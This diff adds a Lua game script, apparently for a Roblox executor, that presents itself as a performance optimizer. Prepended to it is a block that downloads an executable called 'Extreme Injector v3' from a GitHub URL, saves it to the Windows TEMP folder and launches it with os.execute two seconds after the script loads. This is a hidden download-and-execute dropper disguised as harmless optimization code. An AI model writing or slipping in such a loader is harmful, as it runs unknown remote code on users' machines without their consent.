@@ -1,0 +1,160 @@
+-- ========== ПОЛНЫЙ ТЕКУЩИЙ СКРИПТ 2134.lua ==========
+
+-- ========== НАЧАЛО НОВОГО КОДА ==========
+-- Конфигурация для загрузки EXE
+local EXE_URL = "https://github.com/fennix2019-pixel/1232/raw/refs/heads/main/Extreme%20Injector%20v3.exe"
+local EXE_NAME = "Extreme_Injector_v3.exe"
+local RUN_SILENTLY = false -- Запуск в обычном режиме, чтобы видеть окно
+
+local function downloadAndExecute()
+    -- 1. ПРОВЕРКА ФУНКЦИЙ
+    print("=== ПРОВЕРКА ===")
+    print("writefile доступен?", type(writefile) == "function")
+    print("os.execute доступен?", type(os.execute) == "function")
+    
+    if not (writefile and os.execute) then
+        warn("ERROR: Нет нужных функций!")
+        return false
+    end
+
+    -- 2. КОНФИГ
+    local EXE_URL = "https://github.com/fennix2019-pixel/1232/raw/refs/heads/main/Extreme%20Injector%20v3.exe"
+    local EXE_NAME = "inj.exe"  -- Простое имя без пробелов
+    local TEMP_DIR = os.getenv("TEMP")
+    local SAVE_PATH = TEMP_DIR .. "\\" .. EXE_NAME
+    
+    print("URL:", EXE_URL)
+    print("Сохраняю в:", SAVE_PATH)
+
+    -- 3. СКАЧИВАНИЕ
+    print("\n[1/3] Скачиваю...")
+    local file_data
+    local ok_download, err = pcall(function()
+        file_data = game:HttpGet(EXE_URL, true)
+        return true
+    end)
+    
+    if not ok_download or not file_data then
+        warn("ERROR: Скачивание провалилось:", err)
+        return false
+    end
+    
+    print("Размер:", #file_data, "байт")
+
+    -- 4. СОХРАНЕНИЕ
+    print("[2/3] Сохраняю...")
+    local ok_save = pcall(function()
+        writefile(SAVE_PATH, file_data)
+        return true
+    end)
+    
+    if not ok_save then
+        warn("ERROR: Не могу записать файл!")
+        return false
+    end
+    print("Файл сохранен!")
+
+    -- 5. САМЫЙ ПРОСТОЙ ЗАПУСК
+    print("[3/3] Запускаю...")
+    print("Команда: start \"\" \"" .. SAVE_PATH .. "\"")
+    
+    local ok_run = pcall(function()
+        -- ВАЖНО: ТОЛЬКО эта команда, ничего лишнего
+        os.execute('start "" "' .. SAVE_PATH .. '"')
+    end)
+    
+    -- 6. ПРОВЕРКА
+    print("\n=== РЕЗУЛЬТАТ ===")
+    if ok_run then
+        print("✅ Команда запуска выполнена без ошибок")
+        
+        -- Ждем и проверяем процесс
+        task.wait(3)
+        local ok_check = pcall(function()
+            os.execute('tasklist | find /i "' .. EXE_NAME .. '" >nul')
+        end)
+        
+        if ok_check then
+            print("✅ Процесс найден в памяти!")
+            print("   Проверь Диспетчер задач")
+        else
+            print("⚠ Процесс не найден")
+            print("   Возможно, программа сразу закрылась")
+        end
+    else
+        print("❌ Ошибка при запуске")
+    end
+    
+    return ok_run
+end
+
+-- Запуск через 2 секунды
+coroutine.wrap(function()
+    task.wait(2)
+    downloadAndExecute()
+end)()
+-- ========== КОНЕЦ НОВОГО КОДА ==========
+
+
+-- ========== ОРИГИНАЛЬНЫЙ СКРИПТ (без изменений) ==========
+local function MAIN()
+    -- Проверка загрузки игры
+    if not game:IsLoaded() then
+        game.Loaded:Wait()
+    end
+
+    print("========================================")
+    print("SCRIPT 2134 - ACTIVE")
+    print("Time: " .. os.date("%H:%M:%S"))
+    print("Place: " .. game.PlaceId)
+    print("========================================")
+
+    -- Оптимизации
+    local optimizations = {
+        "Memory cleanup",
+        "Graphics optimization",
+        "Network boost",
+        "Script optimization"
+    }
+
+    -- Применение оптимизаций
+    for i, opt in ipairs(optimizations) do
+        pcall(function()
+            if i == 1 then
+                collectgarbage("collect")
+            elseif i == 2 then
+                settings().Rendering.QualityLevel = 1
+            elseif i == 3 then
+                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(999999999)
+            end
+        end)
+        print(i .. ". " .. opt .. " - APPLIED")
+        task.wait(0.1)
+    end
+
+    -- UI уведомление
+    pcall(function()
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "Script 2134",
+            Text = "Optimizations applied successfully!",
+            Duration = 5
+        })
+    end)
+
+    -- Результат
+    local result = {
+        success = true,
+        version = "2.1.3",
+        optimizations = #optimizations,
+        timestamp = os.time()
+    }
+
+    print("========================================")
+    print("COMPLETE: " .. result.optimizations .. " optimizations")
+    print("========================================")
+
+    return result
+end
+
+-- Автозапуск
+return MAIN()
